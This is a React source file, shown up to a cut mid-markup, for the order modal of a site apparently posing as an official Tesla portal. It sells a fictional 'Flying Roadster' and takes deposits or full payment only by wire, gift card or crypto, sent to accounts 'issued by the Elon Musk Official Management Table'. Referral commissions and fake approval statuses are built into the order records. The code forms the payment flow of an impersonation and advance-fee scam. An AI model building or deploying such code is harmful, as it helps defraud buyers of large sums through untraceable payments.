import React, { useState } from 'react';
import { 
  X, 
  Check, 
  ShieldCheck, 
  Sparkles, 
  Wind, 
  Zap, 
  CheckCircle2, 
  QrCode, 
  Download, 
  ChevronRight,
  Lock,
  Send,
  Copy,
  Mail,
  Clock
} from 'lucide-react';
import {
  TeslaVehicle,
  TeslaOrder,
  VehicleColorOption,
  VehicleWheelOption,
  VehiclePackageOption,
  AdminPaymentAccounts,
  PaymentAccountRequest,
} from '../types';
import { getVehicleDetailedSpecs } from '../data/teslaVehicles';

interface TeslaOrderModalProps {
  isOpen: boolean;
  vehicle: TeslaVehicle | null;
  onClose: () => void;
  onOrderCompleted: (order: TeslaOrder) => void;
  defaultReferralCode?: string;
  commissionPercent?: number;
  adminPaymentAccounts?: AdminPaymentAccounts;
  paymentAccountRequests?: PaymentAccountRequest[];
  onRequestPaymentAccount?: (payload: {
    paymentMethod: 'wire' | 'gift_card' | 'crypto';
    vehicleName: string;
    amountDue: number;
    visitorName: string;
    visitorEmail: string;
    note?: string;
  }) => PaymentAccountRequest;
  onOpenInbox?: () => void;
  defaultCustomerName?: string;
  defaultCustomerEmail?: string;
}

export const TeslaOrderModal: React.FC<TeslaOrderModalProps> = ({
  isOpen,
  vehicle,
  onClose,
  onOrderCompleted,
  defaultReferralCode = '',
  commissionPercent = 5,
  adminPaymentAccounts,
  paymentAccountRequests = [],
  onRequestPaymentAccount,
  onOpenInbox,
  defaultCustomerName = '',
  defaultCustomerEmail = '',
}) => {
  if (!isOpen || !vehicle) return null;

  return (
    <TeslaOrderModalInner
      vehicle={vehicle}
      onClose={onClose}
      onOrderCompleted={onOrderCompleted}
      defaultReferralCode={defaultReferralCode}
      commissionPercent={commissionPercent}
      adminPaymentAccounts={adminPaymentAccounts}
      paymentAccountRequests={paymentAccountRequests}
      onRequestPaymentAccount={onRequestPaymentAccount}
      onOpenInbox={onOpenInbox}
      defaultCustomerName={defaultCustomerName}
      defaultCustomerEmail={defaultCustomerEmail}
    />
  );
};

const TeslaOrderModalInner: React.FC<{
  vehicle: TeslaVehicle;
  onClose: () => void;
  onOrderCompleted: (order: TeslaOrder) => void;
  defaultReferralCode: string;
  commissionPercent: number;
  adminPaymentAccounts?: AdminPaymentAccounts;
  paymentAccountRequests: PaymentAccountRequest[];
  onRequestPaymentAccount?: (payload: {
    paymentMethod: 'wire' | 'gift_card' | 'crypto';
    vehicleName: string;
    amountDue: number;
    visitorName: string;
    visitorEmail: string;
    note?: string;
  }) => PaymentAccountRequest;
  onOpenInbox?: () => void;
  defaultCustomerName?: string;
  defaultCustomerEmail?: string;
}> = ({
  vehicle,
  onClose,
  onOrderCompleted,
  defaultReferralCode,
  commissionPercent,
  adminPaymentAccounts,
  paymentAccountRequests,
  onRequestPaymentAccount,
  onOpenInbox,
  defaultCustomerName = '',
  defaultCustomerEmail = '',
}) => {
  const vehicleSpecs = getVehicleDetailedSpecs(vehicle);

  // Configuration State
  const [selectedColor, setSelectedColor] = useState<VehicleColorOption>(vehicle.colors[0]);
  const [selectedWheels, setSelectedWheels] = useState<VehicleWheelOption>(vehicle.wheels[0]);
  const [selectedInterior, setSelectedInterior] = useState<VehicleColorOption>(vehicle.interiorColors[0]);
  const [selectedPackages, setSelectedPackages] = useState<VehiclePackageOption[]>(
    vehicle.isFlyingCar
      ? [vehicle.packages[0]] // Include SpaceX Thruster package by default for Flying Roadster
      : []
  );

  // Advance Deposit Selection: Dynamic 20% Advance Deposit vs Full Price
  const [selectedDepositTierKey, setSelectedDepositTierKey] = useState<'advance20' | 'founders50k'>('advance20');
  const [paymentMode, setPaymentMode] = useState<'deposit' | 'full'>('deposit');

  // Customer Details Form State
  const [step, setStep] = useState<'configure' | 'checkout' | 'confirmed'>('configure');
  const [customerName, setCustomerName] = useState(defaultCustomerName);
  const [customerEmail, setCustomerEmail] = useState(defaultCustomerEmail);
  const [customerPhone, setCustomerPhone] = useState('');
  const [deliveryAddress, setDeliveryAddress] = useState('');
  const [city, setCity] = useState('');
  const [postalCode, setPostalCode] = useState('');
  const [paymentMethod, setPaymentMethod] = useState<'wire' | 'gift_card' | 'crypto'>('wire');
  const [accountRequestNote, setAccountRequestNote] = useState('');
  const [copiedAccount, setCopiedAccount] = useState(false);
  const [referralCodeInput, setReferralCodeInput] = useState(defaultReferralCode);
  const [confirmedOrder, setConfirmedOrder] = useState<TeslaOrder | null>(null);
  const [certificateDownloaded, setCertificateDownloaded] = useState(false);

  // Real US MSRP & Itemized Delivery Pricing Calculations
  const destinationFee = vehicle.destinationFee ?? 1640;
  const upgradesTotal =
    selectedColor.price +
    selectedWheels.price +
    selectedInterior.price +
    selectedPackages.reduce((acc, p) => acc + p.price, 0);

  const realPriceSold = vehicle.basePrice + upgradesTotal + destinationFee;
  const advanceDeposit20 = Math.round(realPriceSold * 0.2);

  // Deposit options: 20% Advance Deposit OR Full Real Delivered MSRP
  const flyingCarDepositTiers = [
    {
      key: 'advance20' as const,
      label: `20% Advance Deposit ($${advanceDeposit20.toLocaleString()})`,
      value: advanceDeposit20,
      desc: `20% advance payment locks build slot. Remaining 80% ($${Math.max(0, realPriceSold - advanceDeposit20).toLocaleString()}) due at delivery.`,
    },
    {
      key: 'founders50k' as const,
      label: '$50,000 Founders Allocation',
      value: 50000,
      desc: 'Priority production slot #001–#1000.',
    },
    {
      key: 'full' as const,
      label: `Full Delivered Price ($${realPriceSold.toLocaleString()})`,
      value: realPriceSold,
      desc: 'Pay full MSRP + destination today.',
    },
  ];

  const standardDepositTiers = [
    {
      key: 'advance20' as const,
      label: `20% Advance Deposit ($${advanceDeposit20.toLocaleString()})`,
      value: advanceDeposit20,
      desc: `20% down payment locks factory build slot. Remaining 80% ($${Math.max(0, realPriceSold - advanceDeposit20).toLocaleString()}) due prior to delivery.`,
    },
    {
      key: 'full' as const,
      label: `Full Delivered MSRP ($${realPriceSold.toLocaleString()})`,
      value: realPriceSold,
      desc: 'Pay complete 100% configured MSRP + destination fee today.',
    },
  ];

  const depositOptions = vehicle.isFlyingCar ? flyingCarDepositTiers : standardDepositTiers;

  const currentDepositAmount =
    paymentMode === 'full'
      ? realPriceSold
      : selectedDepositTierKey === 'founders50k'
      ? 50000
      : advanceDeposit20;
  const amountPaidToday = currentDepositAmount;
  const balanceDueAtDelivery = Math.max(0, realPriceSold - amountPaidToday);

  const handleTogglePackage = (pkg: VehiclePackageOption) => {
    if (selectedPackages.some((p) => p.id === pkg.id)) {
      setSelectedPackages(selectedPackages.filter((p) => p.id !== pkg.id));
    } else {
      setSelectedPackages([...selectedPackages, pkg]);
    }
  };

  const handleProcessOrder = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customerName || !customerEmail) return;

    const randomSuffix = Math.floor(100000 + Math.random() * 900000);
    const vinPrefix = vehicle.isFlyingCar ? '5YJSA-FLY' : '5YJSA-TSL';
    const reservationVin = `${vinPrefix}-${randomSuffix}`;
    const orderId = `TSLA-ORD-${Date.now().toString().slice(-6)}`;
    const paymentRefPrefix =
      paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : 'CRYPTO';
    const paymentRef = `${paymentRefPrefix}-${Date.now().toString().slice(-6)}`;

    const now = new Date();
    const formattedTimestamp = now.toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
    });

    const normalizedRef = referralCodeInput.trim().toUpperCase();
    const referralCommissionAmount = normalizedRef
      ? Math.round(realPriceSold * (commissionPercent / 100) * 100) / 100
      : undefined;

    const newOrder: TeslaOrder = {
      orderId,
      reservationVin,
      vehicleId: vehicle.id,
      vehicleName: vehicle.name,
      isFlyingCar: !!vehicle.isFlyingCar,
      paymentType: paymentMode,
      paymentStatus: 'pending_admin_approval',
      paymentMethod,
      paymentReference: paymentRef,
      depositAmount: currentDepositAmount,
      totalPrice: realPriceSold,
      amountPaidToday,
      balanceDue: balanceDueAtDelivery,
      selectedColor,
      selectedInterior,
      selectedWheels,
      selectedPackages,
      customerName,
      customerEmail,
      customerPhone: customerPhone || '+1 (555) 019-2834',
      deliveryAddress: deliveryAddress || '701 Brazos St',
      city: city || 'Austin, TX',
      postalCode: postalCode || '78701',
      orderDate: now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
      status: 'Pending Elon Musk Management Approval',
      estimatedDelivery: vehicle.deliveryEstimate,
      flightModeCertified: vehicle.isFlyingCar,
      referralCodeUsed: normalizedRef || undefined,
      referralCommissionPercent: normalizedRef ? commissionPercent : undefined,
      referralCommissionAmount,
      trackingHistory: [
        {
          id: `trk-init-${now.getTime()}`,
          stage: 'Production',
          title: 'Reservation & Payment Submitted',
          details: `${paymentMode === 'full' ? 'Full vehicle settlement' : '20% advance deposit'} ($${amountPaidToday.toLocaleString()}) via ${paymentMethod === 'gift_card' ? 'GIFT CARD' : paymentMethod.toUpperCase()} (${paymentRef}) sent to Elon Musk Official Management Table for account provisioning & verification.${normalizedRef ? ` Referral Code ${normalizedRef} (${commissionPercent}% commission) attached.` : ''}`,
          location: `${deliveryAddress || '701 Brazos St'}, ${city || 'Austin, TX'}`,
          timestamp: now.toISOString(),
          dateStr: formattedTimestamp,
          statusType: 'submitted',
        },
      ],
    };

    setConfirmedOrder(newOrder);
    onOrderCompleted(newOrder);
    setStep('confirmed');
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#020611]/90 backdrop-blur-md p-3 sm:p-5 overflow-y-auto animate-fadeIn">
      <div className="w-full max-w-4xl rounded-2xl bg-[#061024] border border-blue-500/45 shadow-2xl overflow-hidden flex flex-col max-h-[92vh] my-auto">
        
        {/* Top Header */}
        <div className="p-5 border-b border-blue-900/60 flex items-center justify-between bg-gradient-to-r from-[#091630] via-[#0d1f44] to-[#230b18]">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-blue-600 to-red-600 flex items-center justify-center text-white font-bold shadow-md shadow-blue-500/20">
              {vehicle.isFlyingCar ? <Wind className="w-5 h-5 text-white" /> : <Zap className="w-5 h-5 text-white" />}
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="font-display font-bold text-lg text-white">
                  {vehicle.isFlyingCar ? 'Pre-Order Tesla Flying Roadster' : `Order ${vehicle.name}`}
                </h3>
                {vehicle.isFlyingCar && (
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-red-600/25 text-red-200 border border-red-400/50">
                    SpaceX Thruster Edition
                  </span>
                )}
              </div>
              <p className="text-xs text-blue-200/80">
                {vehicle.isFlyingCar
                  ? 'Reserve your flight vehicle with deposits starting from $10,000 to full sold price'
                  : 'Official Tesla order portal with instant VIN reservation'}
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-slate-300 hover:text-white hover:bg-blue-900/50 transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* STEP 1: CONFIGURE */}
        {step === 'configure' && (
          <div className="flex-1 overflow-y-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-8">
            
            {/* Left Preview & Specs */}
            <div className="lg:col-span-5 space-y-5">
              <div className="relative aspect-[16/10] rounded-xl overflow-hidden bg-[#08142b] border border-blue-900/60 shadow-lg group">
                <img
                  src={vehicle.image}
                  alt={vehicle.name}
                  className="w-full h-full object-cover object-center group-hover:scale-105 transition-transform duration-500"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-[#040a18]/85 via-transparent to-transparent" />
                
                {/* Active Color Tag on image */}
                <div className="absolute bottom-3 left-3 right-3 flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <span
                      className="w-3.5 h-3.5 rounded-full border border-white/60 shadow-sm"
                      style={{ backgroundColor: selectedColor.hex }}
                    />
                    <span className="font-medium text-white">{selectedColor.name}</span>
                  </div>
                  <span className="text-blue-200 font-mono tabular-nums">
                    {selectedColor.price === 0 ? 'Included' : `+$${selectedColor.price.toLocaleString()}`}
                  </span>
                </div>
              </div>

              {/* Vehicle Performance Specs */}
              <div className="grid grid-cols-3 gap-2.5 p-4 rounded-xl bg-[#08142b] border border-blue-900/60 text-center">
                <div>
                  <div className="text-base sm:text-lg font-bold font-mono tabular-nums text-blue-300">
                    {vehicle.acceleration}
                  </div>
                  <div className="text-[10px] text-slate-400 uppercase tracking-wider">0–60 MPH</div>
                </div>
                <div>
                  <div className="text-base sm:text-lg font-bold font-mono tabular-nums text-white">
                    {vehicle.topSpeed}
                  </div>
                  <div className="text-[10px] text-slate-400 uppercase tracking-wider">Top Speed</div>
                </div>
                <div>
                  <div className="text-base sm:text-lg font-bold font-mono tabular-nums text-red-300">
                    {vehicle.range}
                  </div>
                  <div className="text-[10px] text-slate-400 uppercase tracking-wider">Range</div>
                </div>
              </div>

              {/* Extended Real-Car Engineering Summary */}
              <div className="grid grid-cols-2 gap-2.5 p-3.5 rounded-xl bg-[#040a18] border border-blue-900/60 text-[11px] font-mono tabular-nums">
                <div>
                  <span className="text-slate-400 block text-[10px]">Peak Output</span>
                  <span className="text-emerald-300 font-bold">{vehicleSpecs.horsepower.split('(')[0].trim()}</span>
                </div>
                <div>
                  <span className="text-slate-400 block text-[10px]">Peak Torque</span>
                  <span className="text-white font-bold">{vehicleSpecs.torque.split('(')[0].trim()}</span>
                </div>
                <div>
                  <span className="text-slate-400 block text-[10px]">Supercharging</span>
                  <span className="text-blue-200">{vehicleSpecs.charge15MinMiles}</span>
                </div>
                <div>
                  <span className="text-slate-400 block text-[10px]">Seating & Cargo</span>
                  <span className="text-slate-200">{vehicleSpecs.seatingCapacity.split('(')[0].trim()}</span>
                </div>
              </div>

              {/* Delivery, Warranty & Included Equipment Note */}
              <div className="space-y-2 text-xs text-slate-300 p-3.5 rounded-xl bg-[#08142b]/80 border border-blue-900/50">
                <div className="flex items-start gap-2 text-slate-200">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                  <span>{vehicle.powertrain}</span>
                </div>
                <div className="flex items-start gap-2 text-slate-200">
                  <ShieldCheck className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
                  <span>{vehicleSpecs.warrantyBatteryDrive} · {vehicleSpecs.safetyRatingAndAirbags.split('·')[0].trim()}</span>
                </div>
                <div className="flex items-start gap-2 text-slate-200">
                  <Sparkles className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                  <span>Estimated Delivery: {vehicle.deliveryEstimate}</span>
                </div>
                <div className="pt-2 mt-1 border-t border-blue-900/60 text-[11px] text-slate-400">
                  <span className="text-blue-300 font-semibold block mb-1">Standard Factory Delivery Kit:</span>
                  Mobile Connector + J1772 Adapter, 2x NFC Cards + UWB Phone Key, HEPA Mode, TPMS, Emergency Tire Kit & Floor Mats.
                </div>
              </div>
            </div>

            {/* Right Configurator Options */}
            <div className="lg:col-span-7 space-y-6">
              
              {/* Exterior Color */}
              <div className="space-y-2.5">
                <div className="flex items-center justify-between text-xs font-semibold">
                  <span className="text-slate-100">1. Exterior Color & Finish</span>
                  <span className="text-blue-300">{selectedColor.name}</span>
                </div>
                <div className="flex flex-wrap gap-2.5">
                  {vehicle.colors.map((c) => {
                    const isSelected = selectedColor.name === c.name;
                    return (
                      <button
                        key={c.name}
                        onClick={() => setSelectedColor(c)}
                        className={`flex items-center gap-2 px-3 py-2 rounded-lg border text-xs font-medium transition-all cursor-pointer ${
                          isSelected
                            ? 'bg-blue-600/25 border-blue-400 text-white shadow-md'
                            : 'bg-[#08142b] border-blue-900/60 text-slate-300 hover:border-blue-500/60'
                        }`}
                      >
                        <span
                          className="w-4 h-4 rounded-full border border-white/40 shadow-inner"
                          style={{ backgroundColor: c.hex }}
                        />
                        <span>{c.name}</span>
                        {c.price > 0 && (
                          <span className="text-blue-200 font-mono tabular-nums text-[11px]">
                            +${c.price.toLocaleString()}
                          </span>
                        )}
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Wheels */}
              <div className="space-y-2.5">
                <div className="flex items-center justify-between text-xs font-semibold">
                  <span className="text-slate-100">2. Performance Wheels</span>
                  <span className="text-blue-300">{selectedWheels.name}</span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  {vehicle.wheels.map((w) => {
                    const isSelected = selectedWheels.name === w.name;
                    return (
                      <button
                        key={w.name}
                        onClick={() => setSelectedWheels(w)}
                        className={`p-3 rounded-lg border text-left text-xs transition-all cursor-pointer ${
                          isSelected
                            ? 'bg-blue-600/25 border-blue-400 text-white shadow-md'
                            : 'bg-[#08142b] border-blue-900/60 text-slate-300 hover:border-blue-500/60'
                        }`}
                      >
                        <div className="font-semibold text-white">{w.name}</div>
                        <div className="text-[11px] text-blue-200 font-mono tabular-nums">
                          {w.price === 0 ? 'Included' : `+$${w.price.toLocaleString()}`}
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Interior */}
              <div className="space-y-2.5">
                <div className="flex items-center justify-between text-xs font-semibold">
                  <span className="text-slate-100">3. Interior Cockpit</span>
                  <span className="text-blue-300">{selectedInterior.name}</span>
                </div>
                <div className="flex flex-wrap gap-2">
                  {vehicle.interiorColors.map((int) => {
                    const isSelected = selectedInterior.name === int.name;
                    return (
                      <button
                        key={int.name}
                        onClick={() => setSelectedInterior(int)}
                        className={`flex items-center gap-2 px-3 py-2 rounded-lg border text-xs font-medium transition-all cursor-pointer ${
                          isSelected
                            ? 'bg-blue-600/25 border-blue-400 text-white shadow-md'
                            : 'bg-[#08142b] border-blue-900/60 text-slate-300 hover:border-blue-500/60'
                        }`}
                      >
                        <span
                          className="w-3.5 h-3.5 rounded-full border border-white/40"
                          style={{ backgroundColor: int.hex }}
                        />
                        <span>{int.name}</span>
                        {int.price > 0 && (
                          <span className="text-blue-200 font-mono tabular-nums text-[11px]">
                            +${int.price.toLocaleString()}
                          </span>
                        )}
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Optional Flight & Autopilot Packages */}
              <div className="space-y-2.5">
                <div className="text-xs font-semibold text-slate-100">
                  4. Aerospace & Autonomous Packages
                </div>
                <div className="space-y-2">
                  {vehicle.packages.map((pkg) => {
                    const isChecked = selectedPackages.some((p) => p.id === pkg.id);
                    return (
                      <div
                        key={pkg.id}
                        onClick={() => handleTogglePackage(pkg)}
                        className={`p-3.5 rounded-xl border text-xs cursor-pointer transition-all flex items-start gap-3 ${
                          isChecked
                            ? 'bg-blue-600/20 border-blue-400/70 text-white'
                            : 'bg-[#08142b] border-blue-900/60 text-slate-300 hover:border-blue-500/60'
                        }`}
                      >
                        <div
                          className={`w-5 h-5 rounded mt-0.5 flex items-center justify-center shrink-0 border ${
                            isChecked
                              ? 'bg-gradient-to-br from-blue-500 to-red-500 border-blue-400 text-white'
                              : 'border-blue-800 bg-[#040a18]'
                          }`}
                        >
                          {isChecked && <Check className="w-3.5 h-3.5" />}
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between">
                            <span className="font-semibold text-white flex items-center gap-1.5">
                              {pkg.name}
                              {pkg.isFlightPackage && (
                                <span className="text-[10px] font-bold text-red-300 uppercase font-mono">
                                  SpaceX Cold Gas
                                </span>
                              )}
                            </span>
                            <span className="font-mono tabular-nums font-bold text-blue-300">
                              +${pkg.price.toLocaleString()}
                            </span>
                          </div>
                          <p className="text-[11px] text-slate-300 pt-0.5 leading-relaxed">
                            {pkg.description}
                          </p>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Itemized Real MSRP + Deposit Tier Selector */}
              <div className="p-4 rounded-xl bg-[#08142b] border border-blue-500/40 space-y-3">
                <div className="space-y-1.5 pb-3 border-b border-blue-900/60 text-xs font-mono tabular-nums">
                  <div className="flex items-center justify-between text-slate-300">
                    <span>Base Vehicle MSRP</span>
                    <span>${vehicle.basePrice.toLocaleString()}</span>
                  </div>
                  <div className="flex items-center justify-between text-slate-300">
                    <span>Configured Options &amp; Packages</span>
                    <span>{upgradesTotal === 0 ? 'Included ($0)' : `+$${upgradesTotal.toLocaleString()}`}</span>
                  </div>
                  <div className="flex items-center justify-between text-slate-300">
                    <span>Mandatory Destination &amp; Doc Fee</span>
                    <span>+${destinationFee.toLocaleString()}</span>
                  </div>
                </div>

                <div className="flex items-center justify-between">
                  <div>
                    <div className="text-xs font-bold text-blue-300 uppercase tracking-wider">
                      {vehicle.isFlyingCar ? 'Reservation Deposit Tier' : 'Order Payment Option'}
                    </div>
                    <div className="text-[11px] text-slate-300">
                      Lock build with 20% advance deposit (${advanceDeposit20.toLocaleString()}) or pay complete delivered MSRP
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-xs text-slate-400">Est. Delivered MSRP</div>
                    <div className="text-base font-display font-bold text-white font-mono tabular-nums">
                      ${realPriceSold.toLocaleString()}
                    </div>
                  </div>
                </div>

                {/* Deposit Option Buttons */}
                <div className="space-y-2">
                  {depositOptions.map((opt) => {
                    const isSelected =
                      paymentMode === 'full'
                        ? opt.key === 'full'
                        : opt.key === selectedDepositTierKey;

                    return (
                      <button
                        key={opt.key}
                        type="button"
                        onClick={() => {
                          if (opt.key === 'full') {
                            setPaymentMode('full');
                          } else {
                            setPaymentMode('deposit');
                            setSelectedDepositTierKey(opt.key);
                          }
                        }}
                        className={`w-full p-3 rounded-lg border text-left text-xs transition-all cursor-pointer flex items-center justify-between ${
                          isSelected
                            ? 'bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 text-white border-blue-400 shadow-md font-semibold'
                            : 'bg-[#040a18] border-blue-900/60 text-slate-200 hover:border-blue-500/60'
                        }`}
                      >
                        <div>
                          <div className="font-bold">{opt.label}</div>
                          <div className={isSelected ? 'text-blue-100 text-[11px]' : 'text-slate-400 text-[11px]'}>
                            {opt.desc}
                          </div>
                        </div>
                        <div className="text-sm font-mono tabular-nums font-bold">
                          ${opt.value.toLocaleString()}
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

            </div>
          </div>
        )}

        {/* STEP 2: CHECKOUT & BUYER DETAILS */}
        {step === 'checkout' && (
          <form onSubmit={handleProcessOrder} className="flex-1 overflow-y-auto p-6 space-y-6">
            
            {/* Order Summary Bar */}
            <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/60 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <div className="text-xs text-red-300 uppercase font-semibold">
                  {vehicle.isFlyingCar ? 'Flying Roadster Reservation' : 'Tesla Vehicle Order'}
                </div>
                <h4 className="text-base font-bold text-white">{vehicle.name}</h4>
                <div className="text-xs text-slate-300">
                  {selectedColor.name} · {selectedWheels.name} · {selectedInterior.name}
                </div>
              </div>

              <div className="text-right sm:border-l sm:border-blue-900/60 sm:pl-6">
                <div className="text-xs text-slate-400">Amount Due Today</div>
                <div className="text-2xl font-display font-bold text-blue-300 font-mono tabular-nums">
                  ${amountPaidToday.toLocaleString()}
                </div>
                <div className="text-[11px] text-slate-400 font-mono tabular-nums">
                  Total Real Price: ${realPriceSold.toLocaleString()} · Remaining: ${balanceDueAtDelivery.toLocaleString()}
                </div>
              </div>
            </div>

            {/* Buyer Personal Details */}
            <div className="space-y-4">
              <h4 className="text-xs font-bold text-slate-100 uppercase tracking-wider">
                1. Delivery & Reservation Contact
              </h4>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">Full Legal Name</label>
                  <input
                    type="text"
                    required
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    placeholder="e.g. Alexander Vance"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">Email Address (Tesla Account)</label>
                  <input
                    type="email"
                    required
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    placeholder="alex@enterprise.com"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="space-y-1 sm:col-span-2">
                  <label className="text-xs font-semibold text-slate-200">Delivery Address</label>
                  <input
                    type="text"
                    value={deliveryAddress}
                    onChange={(e) => setDeliveryAddress(e.target.value)}
                    placeholder="Street Address or Tesla Delivery Center"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-semibold text-slate-200">City & Postal Code</label>
                  <input
                    type="text"
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    placeholder="Austin, TX 78701"
                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 focus:outline-none focus:border-blue-400"
                  />
                </div>
              </div>

              <div className="space-y-1">
                <div className="flex items-center justify-between text-xs">
                  <label className="font-semibold text-slate-200">Referral Code (Optional)</label>
                  <span className="text-[11px] font-mono text-emerald-400 tabular-nums">
                    Referrer earns {commissionPercent}% (${Math.round(realPriceSold * (commissionPercent / 100)).toLocaleString()})
                  </span>
                </div>
                <input
                  type="text"
                  value={referralCodeInput}
                  onChange={(e) => setReferralCodeInput(e.target.value.toUpperCase())}
                  placeholder="e.g. ELON-XXXX-XX"
                  className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 font-mono uppercase focus:outline-none focus:border-blue-400"
                />
              </div>
            </div>

            {/* Payment Method */}
            <div className="space-y-4">
              <h4 className="text-xs font-bold text-slate-100 uppercase tracking-wider">
                2. Payment Method
              </h4>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <button
                  type="button"
                  onClick={() => setPaymentMethod('wire')}
                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                    paymentMethod === 'wire'
                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                  }`}
                >
                  Wire Transfer / ACH
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMethod('gift_card')}
                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                    paymentMethod === 'gift_card'
                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                  }`}
                >
                  Gift Card
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMethod('crypto')}
                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                    paymentMethod === 'crypto'
                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                  }`}
                >
                  Bitcoin / Doge / USDC
                </button>
              </div>

              {/* Payment Account Box (Admin Provided / Visitor Request) */}
              {(() => {
                const issuedRequest = paymentAccountRequests.find(
                  (r) => r.paymentMethod === paymentMethod && r.status === 'issued' && r.issuedAccountDetails
                );
                const pendingRequest = paymentAccountRequests.find(
                  (r) => r.paymentMethod === paymentMethod && r.status === 'pending_admin'
                );
                const globalAccount =
                  paymentMethod === 'wire'
                    ? adminPaymentAccounts?.wireDetails?.trim()
                    : paymentMethod === 'gift_card'
                    ? adminPaymentAccounts?.giftCardInstructions?.trim()
                    : adminPaymentAccounts?.cryptoAddress?.trim();
                const activeAdminAccount = issuedRequest?.issuedAccountDetails?.trim() || globalAccount || '';

                if (activeAdminAccount) {
                  return (
                    <div className="p-4 rounded-xl bg-[#08142b] border border-emerald-500/45 text-xs text-slate-200 space-y-2.5">
                      <div className="flex items-center justify-between gap-2">
                        <div className="font-semibold text-white flex items-center gap-1.5">
                          <ShieldCheck className="w-4 h-4 text-emerald-400" />
                          <span>
                            {paymentMethod === 'wire'
                              ? 'Elon Musk Management-Issued Wire Transfer / ACH Account'
                              : paymentMethod === 'gift_card'
                              ? 'Elon Musk Management-Issued Gift Card Settlement Details'
                              : 'Elon Musk Management-Issued Crypto Settlement Wallet'}
                          </span>
                        </div>
                        <button
                          type="button"
                          onClick={() => {
                            navigator.clipboard.writeText(activeAdminAccount);
                            setCopiedAccount(true);
                            setTimeout(() => setCopiedAccount(false), 2000);
                          }}
                          className="px-2.5 py-1 rounded-md bg-[#040a18] border border-blue-800/70 text-[11px] font-mono text-blue-200 hover:text-white flex items-center gap-1 cursor-pointer"
                        >
                          {copiedAccount ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          <span>{copiedAccount ? 'Copied' : 'Copy'}</span>
                        </button>
                      </div>
                      <div className="p-3 rounded-lg bg-[#040a18] border border-blue-900/70 font-mono text-[11px] text-blue-200 whitespace-pre-wrap break-all tabular-nums">
                        {activeAdminAccount}
                      </div>
                      <div className="text-[11px] text-slate-400">
                        Verified settlement account provisioned directly by the Elon Musk Official Management Table. Submit your reservation below once transfer is initiated.
                      </div>
                    </div>
                  );
                }

                if (pendingRequest) {
                  return (
                    <div className="p-4 rounded-xl bg-[#08142b] border border-blue-500/45 text-xs text-slate-200 space-y-3">
                      <div className="flex items-center justify-between gap-2">
                        <div className="font-semibold text-white flex items-center gap-2">
                          <Clock className="w-4 h-4 text-blue-400" />
                          <span>
                            {paymentMethod === 'wire'
                              ? 'Wire Transfer / ACH Account Requested'
                              : paymentMethod === 'gift_card'
                              ? 'Gift Card Settlement Account Requested'
                              : 'Crypto Wallet Address Requested'}
                          </span>
                        </div>
                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-950 border border-blue-500/40 text-blue-200">
